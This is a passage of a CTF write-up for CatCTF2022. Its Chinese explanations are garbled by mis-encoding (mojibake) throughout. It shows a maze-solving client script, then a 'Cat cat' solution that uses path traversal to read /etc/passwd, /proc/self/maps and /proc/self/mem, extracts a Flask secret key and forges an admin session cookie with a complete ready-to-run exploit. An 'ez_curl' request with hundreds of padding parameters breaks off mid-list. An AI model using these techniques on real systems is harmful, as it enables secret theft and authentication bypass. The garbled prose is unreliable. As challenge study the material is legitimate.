p=remote('101.43.78.225',9999)
maze=[]
IsGo=[]
doorkey=[0,0,0]
dx=[1,-1,0,0]
dy=[0,0,1,-1]
flag=1
x=1
y=1
key='DASW'
def InitMaze():
    global maze,IsGo
    maze = []
    IsGo = []
    for i in range(40):
        s=['#' for j in range(40)]
        maze.append(s)
        k=[0 for j in range(40)]
        IsGo.append(k)
def choice():
    p.sendlineafter('(Y/N)','Y')

def judge():
    s=p.recvuntil(b'Now you see:\n')
    if b"can't" in s:
        return False
    return True

def get_maze(k):
    global maze,x,y,flag
    res=judge()
    print(res,x,y)
    if res:
        x += dx[k]
        y += dy[k]

    for i in range(3):
        s = p.recvline().decode()
        for j in range(3):
            if(maze[y+i-1][x+j-1]=='#' or maze[y+i-1][x+j-1]=='@' or flag):maze[y+i-1][x+j-1]=s[j]
    if x==3 and y==1:
        print(res, x, y)
    return res

def PrintMaze():
    #os.system("cls")
    for i in range(30):
        for j in range(30):
            if i==y and j==x:
                print("@",end='')
            else:
                print(maze[i][j],end='')
        print()

def move(dir):
    if len(dir)!=1:return
    dir=dir.upper()
    k = key.find(dir)
    if(k==-1):return
    p.sendline(dir)
    res=get_maze(k)
    PrintMaze()
    return res
line='ssDdww'

def dfs():
    dot=[]
    door=[]
    for i in range(4):
        nx=x+dx[i]
        ny=y+dy[i]
        if IsGo[ny][nx]==0:
            if maze[ny][nx]=='.' or maze[ny][nx]>='a' and maze[ny][nx]<='c':
                dot.append(i)
            elif maze[ny][nx]>='A' and maze[ny][nx]<='C':
                door.append(i)
    for k in dot:
        nx = x + dx[k]
        ny = y + dy[k]
        if maze[ny][nx]>='a' and maze[ny][nx] <='c':
            doorkey[ord(maze[ny][nx]) - ord('a')]+=1
        IsGo[y][x] = 1
        move(key[k])
        dfs()
        move(key[k^1])
        IsGo[y][x] = 0
    for k in door:
        nx = x + dx[k]
        ny = y + dy[k]
        if doorkey[ord(maze[ny][nx])-ord('A')]:
            doorkey[ord(maze[ny][nx])-ord('A')]-=1
        else:
            continue
        IsGo[y][x] = 1
        move(key[k])
        dfs()
        move(key[k ^ 1])
        IsGo[y][x] = 0
choice()
choice()
i=0
InitMaze()
get_maze(-1)
PrintMaze()

while i<len(line):
    dir=line[i]
    move(dir)
    i+=1
flag=0
# x=1
# y=1
# InitMaze()
# move('W')
dfs()
cmd=''
while True:
    dir=input('cmd$')
    dir=dir.upper()
    if dir=='PRINT':
        print(cmd)
        continue
    dir=dir[0]
    k=key.find(dir)
    if k==-1:
        print('wrong')
        continue

    if move(dir):
        cmd += key[k]
```

åœ¨è¿™ä¸ªè„šæœ¬ä¸­ï¼Œä¼šè®°å½•åœ°å›¾ä¸€å±‚çš„æ ·è²Œï¼Œå¯ä»¥æ‰‹èµ°ã€‚å¾—åˆ°æ‰‹èµ°çš„payloadä¹‹åå¯ä»¥åœ¨lineå˜é‡æœ«å°¾æ·»åŠ ï¼Œå†ä»¥æ­¤ä¸ºåŸºç¡€å†è¿›è¡Œdfsï¼Œå¤šæ¬¡æ¥å›ä¹‹åå¯ä»¥å¾—åˆ°åœ°å›¾å…¨è²Œå’Œè·¯çº¿ã€‚

#### åœ°å›¾

```text
#####################<#...............a##.#.######A##########...#......#.......######B####.#.#####C##aaaa.#c#..#.#...#.########.#.##.#.#.#.##.A.#.A.#..#.#.#.#.##.#.A.#.##.#.#.#.#.##.#######..#.#.#.#.##.........##.#.#.#.##.##########.#.#.#.##.#...#..#..A#.#.#.##.#.#.#.####.#b#.#.##.#.#.#..#...###.#.##.#.#.##.#.#.#.#.#.##...#.#..#.#.#...#.######.#.##.#.#.#.#.##..........#...#.#>##########################################<#............#...##.#.###.######.#.#.##...#.#.#.#..#.#.#.######.#.#.C.b#.#.#.##.........#..#.#.#.#########.#######.#.##...#.a#.........#.##.#.#.##.#########.##.#.#.##.#.........##.#.#..#.#.##########.#.##.#.#....B....##.#....#.#.#.#.###.##.#.####.#.#.#a#c#.##.#.AAb#.#.#.#a#.#.##.######.#.#.###.#.##........###.A...#.##.########>#######.##........#B........##########################################<.................########.##########.##..........#...#b#.########.#..#.#.#.#.##....a#.#..#.#.#.#.##.#####.#....#.#.#.##.#a..C.######.#.#.##.#####......#.#.#.##.C.#...######.#.#.##.#.#.#......#.A.#.##.#.#.#.####.#####.##.#.#.#....#.#a....##.#.#.#.####.########.#.#.#....#B.....c##.#.#.####.#.########.#.#.#....#A.....c##.#.#.######.########.#...#.....A.....>##########################################<#a...............##.################.##..................##.###################.A...............b##.###################.C...............a##.###################.#.A.#.a.#.BA#.CB>##.Bc#ba.#.B.#Ac.#..##.###################.B..............aa##.###################.C.............bbb##.###################.AA............bbb##.###################.BBB.............c##########################################<#................##.#.##############.##.#..............#.##.##############.#.##.#..............#.##.#.##############.##.#..............#.##.##############.#.##.#ac#...#...#...#.##.##B..#...#...#.#.##.################.##..................##b###################.#...............>##.#C#################.#................##.################.##A.................##########################################<#.a..............##.#.##############.##...#...........b#.######A############.##................#.#################.#.##...Ca#c.......#.#.##.#.#a########A#.#.##.#.#.#........#.#.##.#.#.#.########.#.##.#.#.#.#.C....#.#.##.#.#.#.#>#.##.#.#.##.#.#.#A######.#.#.##.#.#..........#.#.##.#.############.#.##.#................##.###################.B...............c##########################################<................a##.################.##..................###################A##..................##.###################..................##.################.##.#aB.#c####>#...#.##.#.#.#..##.C#.#.#.##.#.#.#.####.#.#.#.##.#.#.#..##..#.#.#.##.#.#.##.##.##.#.#.##.#.#.#..##..#.#.#.##.#.#.#.####.#.#.#.##.#.#.#..##.b#.#.#.##.#.#.##.##.##.#.#.##...#....##....#.A.##########################################<#...............c##.#.#################..................#################C####c#..............#>##.#.############.#.##.#.#.........a#.#.##.#.#.##########.#.##.#.#..........#.#.##.#.##########.#.#.##.#.#..........#.#B##.#.#.##########.#.##.#.#.............C##.#.#.############.##.#.#.#...#...#b##.##.#.#.#.#.#.#.#.##.##.#.#.#.#.#.#.#.##.##.A.#...#...#.A.##a##########################################<#.......a........##.#C##############C##cc................####A#################>#.C.............b##.#.#################.#.#..............##.#.#.############.##.#.#.#..a#........##.#.#.#.#.#.####.#.##.#.#.#.#.#......#.##.#.#.#.#.#.####.#.##.#.#.#.#.#......#.##.#.#.#.#.######.#.##.#.#.#.#.#..A.#.#.##.#...#.#.#.c#...#.##.#####.#.########.##.C.....#.B........##########################################<.................####.##############C##...#....#...#...#.##.#...##...#...#b#.##.#.##############.##.#..............#.##.##############.#.##.#..............#.##.#.##############.##.#..............#.##.##############.#.##.#..............#.##.#.##############.##.#..............#.##.##############B#T##.#a.............####A###################...............c#-#####################
```

## WEB

### ez\_jsğŸ¦

![](Nepnep-CatCTF2022/ezjs_0joxEf_9RP.png)

![](Nepnep-CatCTF2022/ezjsFlag_ZAsp7O0tyR.png)

### Cat catğŸ˜¼

Edited by lx56

#### ä¿¡æ¯æ”¶é›†ä¸å°è¯•

#### é¢˜ç›®é¦–é¡µ

è¿›å…¥é¢˜ç›®é¦–é¡µå¯å¾—ä»¥ä¸‹ç•Œé¢

![](Nepnep-CatCTF2022/æˆªå›¾1_Uri1WaaZUX.png)

å°è¯•ç‚¹å‡»ç»¿è‰²æ–‡å­—å¯ä»¥è·³è½¬åˆ°å¦‚ä¸‹é¡µé¢ï¼Œå¯ä»¥çŒœæµ‹å¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–

![](Nepnep-CatCTF2022/æˆªå›¾2_NkYSZXQpfC.jpg)

#### å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶

æ£€æµ‹æ˜¯å¦èƒ½ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–/etc/passwdæˆåŠŸ

![](Nepnep-CatCTF2022/æˆªå›¾3_kQ1eEIpmBZ.jpg)

#### è¯»å–æºç 

å…ˆè¯»å–cmdlineè·å–æºç æ–‡ä»¶å

![](Nepnep-CatCTF2022/æˆªå›¾4_-CVDzoa2Ty.jpg)

é€šè¿‡../app.pyè¯»å–æºç 

![](Nepnep-CatCTF2022/æˆªå›¾5_GcJcK3a_on.jpg)

ä¸Šå›¾è¯»å‡ºæ¥çš„æºç å¾ˆä¹±ï¼Œä½†ç”±å‰é¢bå¼€å¤´å¯çŸ¥è¿™æ˜¯pythonä¸­çš„bytesç±»å‹

å¯ä»¥ç›´æ¥ä½¿ç”¨bytesçš„decode()æ–¹æ³•è·å–æ ¼å¼åŒ–çš„æºç ï¼Œå¦‚ä¸‹

```python
a = b'abc\nabc'
print(a.decode())
```

![](Nepnep-CatCTF2022/æˆªå›¾6_eUY-8G2vkP.jpg)

è·å–æºç å¦‚ä¸‹

![](Nepnep-CatCTF2022/æˆªå›¾7_6d29js3muE.jpg)

#### [app.py](http://app.py "app.py")

```python
import os
import uuid
from flask import Flask, request, session, render_template, Markup
from cat import cat

flag = ""
app = Flask(
 __name__,
 static_url_path='/',
 static_folder='static'
)
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
if os.path.isfile("/flag"):
 flag = cat("/flag")
 os.remove("/flag")

@app.route('/', methods=['GET'])
def index():
 detailtxt = os.listdir('./details/')
 cats_list = []
 for i in detailtxt:
   cats_list.append(i[:i.index('.')])

 return render_template("index.html", cats_list=cats_list, cat=cat)



@app.route('/info', methods=["GET", 'POST'])
def info():
 filename = "./details/" + request.args.get('file', "")
 start = request.args.get('start', "0")
 end = request.args.get('end', "0")
 name = request.args.get('file', "")[:request.args.get('file', "").index('.')]

 return render_template("detail.html", catname=name, info=cat(filename, start, end))



@app.route('/admin', methods=["GET"])
def admin_can_list_root():
 if session.get('admin') == 1:
   return flag
 else:
   session['admin'] = 0
   return "NoNoNo"



if __name__ == '__main__':
 app.run(host='0.0.0.0', debug=False, port=5637)
```

#### ä»£ç å®¡è®¡

ä»æºç å¯çŸ¥Python3ç¨‹åºï¼Œä½¿ç”¨äº†Flaskæ¡†æ¶

#### [å®¡è®¡app.py](http://xn--app-gg0fs23s.py "å®¡è®¡app.py")

#### flagéƒ¨åˆ†

é¦–å…ˆå…³æ³¨å«æœ‰flagçš„éƒ¨åˆ†ï¼Œä»¥ä¸‹ä»£ç å¯çŸ¥ç¨‹åºä¸€å¯åŠ¨å°±è¯»å–å¹¶åˆ é™¤flagæ–‡ä»¶

```python
if os.path.isfile("/flag"):
 flag = cat("/flag")
 os.remove("/flag")
```

å…³æ³¨åˆ°adminè·¯ç”±å¯ä»¥è·å–flagï¼Œä½†æ˜¯éœ€è¦å®Œæˆsessionä¼ªé€ 

éœ€è¦ä¼ªé€ å†…å®¹ä¸º`{"admin" : 1}`çš„sessionï¼Œåˆ™éœ€è¦è·å–secret key

```python
@app.route('/admin', methods=["GET"])
def admin_can_list_root():
 if session.get('admin') == 1:
   return flag
 else:
   session['admin'] = 0
   return "NoNoNo"
```

secret keyéƒ¨åˆ†å¦‚ä¸‹ï¼Œæ˜¯ç”Ÿæˆä¸€ä¸ªuuidç„¶åå»é™¤`-`å†æ‹¼æ¥`*abcdefgh`ç»„æˆçš„

```python
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
```

#### æ–‡ä»¶è¯»å–éƒ¨åˆ†

å¯ä»¥çœ‹åˆ°ä»»æ„æ–‡ä»¶è¯»å–åŠŸèƒ½æ˜¯infoè·¯ç”±æä¾›çš„ï¼Œ

æ³¨æ„åˆ°å¯æ§å‚æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯fileï¼Œstartå’Œend

è¿˜æ³¨æ„åˆ°å…¶ä¸­æœ‰ä¸ªcatå‡½æ•°

```python
@app.route('/info', methods=["GET", 'POST'])
def info():
 filename = "./details/" + request.args.get('file', "")
 start = request.args.get('start', "0")
 end = request.args.get('end', "0")
 name = request.args.get('file', "")[:request.args.get('file', "").index('.')]

 return render_template("detail.html", catname=name, info=cat(filename, start, end))
```

åˆ†ææºç å¯çŸ¥catå‡½æ•°ç”±cat.pyæä¾›

```python
from cat import cat
```

#### [å®¡è®¡cat.py](http://xn--cat-gg0fs23s.py "å®¡è®¡cat.py")

ä½¿ç”¨åŒæ ·çš„æ–¹æ³•è¯»å–cat.pyçš„æºç 

```python
import os, sys, getopt


def cat(filename, start=0, end=0)->bytes:
    data = b''
    
    try:
        start = int(start)
        end = int(end)
        
    except:
        start=0
        end=0
    
    if filename != "" and os.access(filename, os.R_OK):
        f = open(filename, "rb")

        if start >= 0:
            f.seek(start)
            if end >= start and end != 0:
                data = f.read(end-start)
                
            else:
                data = f.read()
                
        else:
            data = f.read()
            
        f.close()
        
    else:
        data = ("File `%s` not exist or can not be read" % filename).encode()
            
    return data


if __name__ == '__main__':
    opts,args = getopt.getopt(sys.argv[1:],'-h-f:-s:-e:',['help','file=','start=','end='])
    fileName = ""
    start = 0
    end = 0
    
    for opt_name, opt_value in opts:
        if opt_name == '-h' or opt_name == '--help':
            print("[*] Help")
            print("-f --file   File name")
            print("-s --start   Start position")
            print("-e --end   End position")
            print("[*] Example of reading /etc/passwd")
            print("python3 cat.py -f /etc/passwd")
            print("python3 cat.py --file /etc/passwd")
            print("python3 cat.py -f /etc/passwd -s 1")
            print("python3 cat.py -f /etc/passwd -e 5")
            print("python3 cat.py -f /etc/passwd -s 1 -e 5")
            exit()

        elif opt_name == '-f' or opt_name == '--file':
            fileName = opt_value
        
        elif opt_name == '-s' or opt_name == '--start':
            start = opt_value
            
        elif opt_name == '-e' or opt_name == '--end':
            end = opt_value

    if fileName != "":
        print(cat(fileName, start, end)) 
        
    else:
        print("No file to read")
```

#### æ–‡ä»¶è¯»å–åŠŸèƒ½

cat.pyåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ•´æ®µæºç æœ€é‡è¦çš„éƒ¨åˆ†å¦‚ä¸‹

ä¸‹é¢ä»£ç çš„ä½œç”¨æ˜¯è¯»å–æ–‡ä»¶å¹¶ä»¥bytesè¿”å›ï¼Œè§‚å¯Ÿå¯çŸ¥å¯ä»¥è®¾å®šè¯»å–ä½ç½®ï¼ˆstartã€endï¼‰

```python
def cat(filename, start=0, end=0)->bytes:
    data = b''
    
    try:
        start = int(start)
        end = int(end)
        
    except:
        start=0
        end=0
    
    if filename != "" and os.access(filename, os.R_OK):
        f = open(filename, "rb")

        if start >= 0:
            f.seek(start)
            if end >= start and end != 0:
                data = f.read(end-start)
                
            else:
                data = f.read()
                
        else:
            data = f.read()
            
        f.close()
        
    else:
        data = ("File `%s` not exist or can not be read" % filename).encode()
            
    return data
```

#### ä½¿ç”¨æ–¹æ³•

ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹

ä¾‹å¦‚æ–°å»ºä¸€ä¸ªa.txtï¼Œå†…å®¹å¦‚ä¸‹

```python
abcdefg
```

ä½¿ç”¨app.pyè¯»å–a.txtï¼Œä»ç¬¬1ä¸ªä½ç½®å¼€å§‹åˆ°ç¬¬3ä¸ªä½ç½®

```bash
python3 cat.py -s 1 -e 3 -f a.txt
```

![](Nepnep-CatCTF2022/æˆªå›¾8_iR0nB5T-O1.png)

#### è§£é¢˜

è¿™é¢˜çš„å…³é”®ç‚¹å°±æ˜¯ä¼ªé€ sessionï¼Œä»è€Œè®¿é—®adminè·¯ç”±è·å–flag

ä½†ä¼ªé€ sessionéœ€è¦è·å–secret key

#### è·å–secret key

è¿™é‡Œå¯ä»¥åˆ©ç”¨pythonå­˜å‚¨å¯¹è±¡çš„ä½ç½®åœ¨å †ä¸Šè¿™ä¸ªç‰¹æ€§ï¼Œ

appæ˜¯å®ä¾‹åŒ–çš„Flaskå¯¹è±¡ï¼Œè€Œsecret keyåœ¨`app.config['SECRET_KEY']`ï¼Œ

æ‰€ä»¥å¯ä»¥é€šè¿‡è¯»å–/proc/self/memæ¥è¯»å–secret key

#### è¯»å–å †æ ˆåˆ†å¸ƒ

ç”±äº/proc/self/memå†…å®¹è¾ƒå¤šè€Œä¸”å­˜åœ¨ä¸å¯è¯»å†™éƒ¨åˆ†ï¼Œç›´æ¥è¯»å–ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œ

æ‰€ä»¥å…ˆè¯»å–/proc/self/mapsè·å–å †æ ˆåˆ†å¸ƒ

```python
map_list = requests.get(url + f"info?file={bypass}/proc/self/maps")
map_list = map_list.text.split("\\n")
for i in map_list:
    map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
    if map_addr:
        start = int(map_addr.group(1), 16)
        end = int(map_addr.group(2), 16)
        print("Found rw addr:", start, "-", end)
```

#### è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®

ç„¶åè¯»å–/proc/self/memï¼Œè¯»å–å¯¹åº”ä½ç½®çš„å†…å­˜æ•°æ®ï¼Œ

å†ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æŸ¥æ‰¾å†…å®¹

```python
res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
if "*abcdefgh" in res.text:
   secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", res.text)
      if secret_key:
    print("Secret Key:", secret_key[0])
```

#### ä¼ªé€ session

sessionä¼ªé€ å¯ä»¥åˆ©ç”¨å¦‚ä¸‹[é¡¹ç›®](https://github.com/noraj/flask-session-cookie-manager "é¡¹ç›®")

```python
https://github.com/noraj/flask-session-cookie-manager
```

#### ä¸€é”®è·å–flag

```python
# coding=utf-8
#----------------------------------
###################################
#Edited by lx56@blog.lxscloud.top
###################################
#----------------------------------
import requests
import re
import ast, sys
from abc import ABC
from flask.sessions import SecureCookieSessionInterface


url = "http://"

#æ­¤ç¨‹åºåªèƒ½è¿è¡ŒäºPython3ä»¥ä¸Š
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')

#----------------session ä¼ªé€ ----------------
class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key
        
class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e
#-------------------------------------------



#ç”±/proc/self/mapsè·å–å¯è¯»å†™çš„å†…å­˜åœ°å€ï¼Œå†æ ¹æ®è¿™äº›åœ°å€è¯»å–/proc/self/memæ¥è·å–secret key
s_key = ""
bypass = "../.."
#è¯·æ±‚fileè·¯ç”±è¿›è¡Œè¯»å–
map_list = requests.get(url + f"info?file={bypass}/proc/self/maps")
map_list = map_list.text.split("\\n")
for i in map_list:
    #åŒ¹é…æŒ‡å®šæ ¼å¼çš„åœ°å€
    map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
    if map_addr:
        start = int(map_addr.group(1), 16)
        end = int(map_addr.group(2), 16)
        print("Found rw addr:", start, "-", end)
        
        #è®¾ç½®èµ·å§‹å’Œç»“æŸä½ç½®å¹¶è¯»å–/proc/self/mem
        res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
        #å¦‚æœå‘ç°*abcdefghå­˜åœ¨å…¶ä¸­ï¼Œè¯´æ˜æˆåŠŸæ³„éœ²secretkey
        if "*abcdefgh" in res.text:
            #æ­£åˆ™åŒ¹é…ï¼Œæœ¬é¢˜secret keyæ ¼å¼ä¸º32ä¸ªå°å†™å­—æ¯æˆ–æ•°å­—ï¼Œå†åŠ ä¸Š*abcdefgh
            secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", res.text)
            if secret_key:
                print("Secret Key:", secret_key[0])
                s_key = secret_key[0]
                break

#è®¾ç½®sessionä¸­adminçš„å€¼ä¸º1
data = '{"admin":1}'
#ä¼ªé€ session
headers = {
    "Cookie" : "session=" + FSCM.encode(s_key, data)
}
#è¯·æ±‚adminè·¯ç”±
try:
    flag = requests.get(url + "admin", headers=headers)
    print("Flag is", flag.text)
except:
    print("Something error")
```

![](Nepnep-CatCTF2022/getflag_njEw5pkT4W.png)

#### å†™åœ¨æœ€å

æä¾›docker-composeç­‰æ–‡ä»¶ï¼š[https://blog.lxscloud.top/static/post/CTF\_Python\_Flask/catcat/cat\_cat.zip](https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/cat_cat.zip "https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/cat_cat.zip")

è‹¥å¸ˆå‚…æƒ³è¦ç›´æ¥å¤ç°å¯ä»¥åˆ°æˆ‘çš„CTFå¹³å°ï¼š[https://ctfm.lxscloud.top/category/test/challenge/13](https://ctfm.lxscloud.top/category/test/challenge/13 "https://ctfm.lxscloud.top/category/test/challenge/13")

åŒæ—¶æä¾›expæ–‡ä»¶ä¸‹è½½ï¼ˆPython3.6ä»¥ä¸Šï¼‰ï¼š[https://blog.lxscloud.top/static/post/CTF\_Python\_Flask/catcat/getFlag.py](https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/getFlag.py "https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/getFlag.py")

### ez\_bypassğŸ¥

ç®€å•çš„ bypass filter

![](Nepnep-CatCTF2022/ezbypassFlag_m2yqdH2WPI.png)

### ez\_curlğŸ”—

```text
POST / HTTP/1.1
Host: 127.0.0.1:2334
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 11945

{"headers":["admin: t",
" true: t"],"params":{"admin":"t",
"2":"1",
"3":"1",
"4":"1",
"5":"1",
"6":"1",
"7":"1",
"8":"1",
"9":"1",
"10":"1",
"11":"1",
"12":"1",
"13":"1",
"14":"1",
"15":"1",
"16":"1",
"17":"1",
"18":"1",
"19":"1",
"20":"1",
"21":"1",
"22":"1",
"23":"1",
"24":"1",
"25":"1",
"26":"1",
"27":"1",
"28":"1",
"29":"1",
"30":"1",
"31":"1",
"32":"1",
"33":"1",
"34":"1",
"35":"1",
"36":"1",
"37":"1",
"38":"1",
"39":"1",
"40":"1",
"41":"1",
"42":"1",
"43":"1",
"44":"1",
"45":"1",
"46":"1",
"47":"1",
"48":"1",
"49":"1",
"50":"1",
"51":"1",
"52":"1",
"53":"1",
"54":"1",
"55":"1",
"56":"1",
"57":"1",
"58":"1",
"59":"1",
"60":"1",
"61":"1",
"62":"1",
"63":"1",
"64":"1",
"65":"1",
"66":"1",
"67":"1",
"68":"1",
"69":"1",
"70":"1",
"71":"1",
"72":"1",
"73":"1",
"74":"1",
"75":"1",
"76":"1",
"77":"1",
"78":"1",
"79":"1",
"80":"1",
"81":"1",
"82":"1",
"83":"1",
"84":"1",
"85":"1",
"86":"1",
"87":"1",
"88":"1",
"89":"1",
"90":"1",
"91":"1",
"92":"1",
"93":"1",
"94":"1",
"95":"1",
"96":"1",
"97":"1",
"98":"1",
"99":"1",
"100":"1",
"101":"1",
"102":"1",
"103":"1",
"104":"1",
"105":"1",
"106":"1",
"107":"1",
"108":"1",
"109":"1",
"110":"1",
"111":"1",
"112":"1",
"113":"1",
"114":"1",
"115":"1",
"116":"1",
"117":"1",
"118":"1",
"119":"1",
"120":"1",
"121":"1",
"122":"1",
"123":"1",
"124":"1",
"125":"1",
"126":"1",
"127":"1",
"128":"1",
"129":"1",
"130":"1",
"131":"1",
"132":"1",
"133":"1",
"134":"1",
"135":"1",
"136":"1",
"137":"1",
"138":"1",
"139":"1",
"140":"1",
"141":"1",
"142":"1",
"143":"1",
"144":"1",
"145":"1",
"146":"1",
"147":"1",
"148":"1",
"149":"1",
"150":"1",
"151":"1",
"152":"1",
"153":"1",
"154":"1",
"155":"1",
"156":"1",
"157":"1",
"158":"1",
"159":"1",
"160":"1",
"161":"1",
"162":"1",
"163":"1",
"164":"1",
"165":"1",
"166":"1",
"167":"1",
"168":"1",
"169":"1",
"170":"1",
"171":"1",
"172":"1",
"173":"1",
"174":"1",
"175":"1",
"176":"1",
"177":"1",
"178":"1",
"179":"1",
"180":"1",
"181":"1",
"182":"1",
"183":"1",
"184":"1",
"185":"1",
"186":"1",
"187":"1",
"188":"1",
"189":"1",
"190":"1",
"191":"1",
"192":"1",
"193":"1",
"194":"1",
"195":"1",
"196":"1",
"197":"1",
"198":"1",
"199":"1",
"200":"1",
"201":"1",
"202":"1",
"203":"1",
"204":"1",
"205":"1",
"206":"1",
"207":"1",
"208":"1",
"209":"1",
"210":"1",
"211":"1",
"212":"1",
"213":"1",
"214":"1",
"215":"1",
"216":"1",
"217":"1",
"218":"1",
"219":"1",
"220":"1",
"221":"1",
"222":"1",
"223":"1",
"224":"1",
"225":"1",
"226":"1",
"227":"1",
"228":"1",
"229":"1",
"230":"1",
"231":"1",
"232":"1",
"233":"1",
"234":"1",
"235":"1",
"236":"1",
"237":"1",
"238":"1",
"239":"1",
"240":"1",
"241":"1",
"242":"1",
"243":"1",
"244":"1",
"245":"1",
"246":"1",
"247":"1",
"248":"1",
"249":"1",
"250":"1",
"251":"1",
"252":"1",
"253":"1",
"254":"1",
"255":"1",
"256":"1",
"257":"1",
"258":"1",
"259":"1",
"260":"1",
"261":"1",
"262":"1",
"263":"1",
"264":"1",
"265":"1",
"266":"1",
"267":"1",
"268":"1",
"269":"1",
"270":"1",
"271":"1",
"272":"1",
"273":"1",
"274":"1",
"275":"1",
"276":"1",
"277":"1",
"278":"1",
"279":"1",
"280":"1",
"281":"1",
"282":"1",
"283":"1",
"284":"1",
"285":"1",
"286":"1",
"287":"1",
"288":"1",
"289":"1",
"290":"1",
"291":"1",
"292":"1",
"293":"1",
"294":"1",
"295":"1",
"296":"1",
"297":"1",
"298":"1",
"299":"1",
"300":"1",
"301":"1",
"302":"1",
"303":"1",
"304":"1",
"305":"1",
"306":"1",
"307":"1",
"308":"1",
"309":"1",
"310":"1",
"311":"1",
"312":"1",
"313":"1",
"314":"1",
"315":"1",
"316":"1",
"317":"1",
"318":"1",
"319":"1",
"320":"1",
"321":"1",
"322":"1",
"323":"1",
"324":"1",
"325":"1",
"326":"1",
"327":"1",
"328":"1",
"329":"1",
"330":"1",
"331":"1",
"332":"1",
"333":"1",
"334":"1",
"335":"1",
"336":"1",
"337":"1",
"338":"1",
"339":"1",
"340":"1",
"341":"1",
"342":"1",
"343":"1",
"344":"1",
"345":"1",
"346":"1",
"347":"1",
"348":"1",
"349":"1",
"350":"1",
"351":"1",
"352":"1",
"353":"1",
"354":"1",
"355":"1",
"356":"1",
"357":"1",
"358":"1",
"359":"1",
"360":"1",
"361":"1",
"362":"1",
"363":"1",
"364":"1",
"365":"1",
"366":"1",
"367":"1",
"368":"1",
"369":"1",
"370":"1",
"371":"1",
"372":"1",
"373":"1",
"374":"1",
"375":"1",
"376":"1",
"377":"1",
"378":"1",
"379":"1",
"380":"1",
"381":"1",
"382":"1",
"383":"1",
"384":"1",
"385":"1",
"386":"1",
"387":"1",
"388":"1",
"389":"1",
"390":"1",
"391":"1",
"392":"1",
"393":"1",
"394":"1",
"395":"1",
"396":"1",
"397":"1",
"398":"1",
"399":"1",
"400":"1",
"401":"1",
"402":"1",
"403":"1",
"404":"1",
"405":"1",
"406":"1",
"407":"1",
"408":"1",
"409":"1",
"410":"1",
"411":"1",
"412":"1",
"413":"1",
"414":"1",
"415":"1",
"416":"1",
"417":"1",
"418":"1",
"419":"1",
"420":"1",
"421":"1",
"422":"1",
"423":"1",
"424":"1",
"425":"1",
"426":"1",
"427":"1",
"428":"1",
"429":"1",
"430":"1",
"431":"1",
"432":"1",
"433":"1",
"434":"1",
"435":"1",
"436":"1",
"437":"1",
"438":"1",
"439":"1",
"440":"1",
"441":"1",
"442":"1",
"443":"1",
"444":"1",
"445":"1",
"446":"1",
"447":"1",
"448":"1",
"449":"1",
"450":"1",
"451":"1",
"452":"1",
"453":"1",
"454":"1",
"455":"1",
"456":"1",
"457":"1",
"458":"1",
"459":"1",
"460":"1",
"461":"1",
"462":"1",
"463":"1",
"464":"1",
"465":"1",
"466":"1",
"467":"1",
"468":"1",
"469":"1",
"470":"1",
"471":"1",
"472":"1",
"473":"1",
"474":"1",
"475":"1",
"476":"1",
"477":"1",
"478":"1",
"479":"1",
"480":"1",
"481":"1",
"482":"1",
"483":"1",
"484":"1",
"485":"1",
"486":"1",
"487":"1",
"488":"1",
"489":"1",
"490":"1",
"491":"1",
"492":"1",
"493":"1",
"494":"1",
"495":"1",
"496":"1",
"497":"1",
"498":"1",
"499":"1",
"500":"1",
"501":"1",
"502":"1",
"503":"1",
"504":"1",
"505":"1",
"506":"1",
"507":"1",
"508":"1",
"509":"1",
"510":"1",
"511":"1",
"512":"1",
"513":"1",
"514":"1",
"515":"1",
"516":"1",
"517":"1",
"518":"1",
"519":"1",
"520":"1",
"521":"1",
"522":"1",
"523":"1",
"524":"1",
"525":"1",
"526":"1",
"527":"1",
"528":"1",
"529":"1",
"530":"1",
"531":"1",
"532":"1",
"533":"1",
"534":"1",
"535":"1",
"536":"1",
"537":"1",
"538":"1",
"539":"1",
"540":"1",
"541":"1",
"542":"1",
"543":"1",
"544":"1",
"545":"1",
"546":"1",
"547":"1",
"548":"1",
"549":"1",
"550":"1",
"551":"1",
"552":"1",
